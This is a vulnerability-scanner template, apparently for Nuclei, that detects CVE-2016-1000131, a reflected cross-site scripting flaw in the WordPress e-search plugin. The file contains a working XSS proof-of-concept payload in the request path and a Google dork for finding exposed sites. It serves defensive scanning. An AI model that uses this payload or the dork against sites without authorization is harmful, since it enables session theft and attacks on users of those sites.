flow: http(1) && http(2)
http:
- matchers:
  - condition: and
    internal: true
    type: word
    words:
    - Search
    - 'Tags:'
    - 'Tested up to:'
  raw:
  - 'GET /wp-content/plugins/e-search/readme.txt HTTP/1.1

    Host: {{Hostname}}

    '
- matchers:
  - part: body
    type: word
    words:
    - </script><script>alert(document.domain)</script>
  - part: header
    type: word
    words:
    - text/html
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/wp-content/plugins/e-search/tmpl/title_az.php?title_az=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E'
id: CVE-2016-1000131
info:
  author: daffainfo
  classification:
    cpe: cpe:2.3:a:e-search_project:esearch:1.0:*:*:*:*:wordpress:*:*
    cve-id: CVE-2016-1000131
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cwe-id: CWE-79
    epss-percentile: 0.83784
    epss-score: 0.02155
  description: WordPress e-search 1.0 and before contains a reflected cross-site scripting
    vulnerability via title_az.php which allows an attacker to execute arbitrary script
    code in the browser of an unsuspecting user in the context of the affected site.
    This can allow the attacker to steal cookie-based authentication credentials and
    launch other attacks.
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    inject malicious scripts into web pages viewed by users, leading to potential
    data theft, session hijacking, or defacement.

    '
  metadata:
    framework: wordpress
    google-query: inurl:"/wp-content/plugins/e-search"
    max-request: 2
    product: esearch
    vendor: e-search_project
  name: WordPress e-search <=1.0 - Cross-Site Scripting
  reference:
  - http://www.vapidlabs.com/wp/wp_advisory.php?v=393
  - https://wordpress.org/plugins/e-search
  - https://nvd.nist.gov/vuln/detail/CVE-2016-1000131
  - https://github.com/ARPSyndicate/kenzer-templates
  remediation: 'Update to the latest version of the WordPress e-search plugin to mitigate
    this vulnerability.

    '
  severity: medium
  tags: cve2016,cve,wordpress,xss,wp-plugin,e-search_project,vuln
